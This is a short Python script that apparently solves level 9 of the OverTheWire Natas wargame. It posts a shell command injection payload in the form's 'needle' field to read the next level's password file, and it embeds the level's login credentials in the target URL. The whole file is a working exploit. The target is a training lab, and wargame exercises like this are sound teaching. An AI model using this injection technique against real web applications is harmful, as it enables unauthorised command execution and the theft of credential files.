import requests

target = 'http://natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl@natas9.natas.labs.overthewire.org'
payload = {'needle':'; cat /etc/natas_webpass/natas10 #','submit':'Submit'}

r = requests.post(target,data=payload)
if r.status_code != requests.codes.ok :
	print 'Unable to connect'
else :
	print 'Connected'

print r.text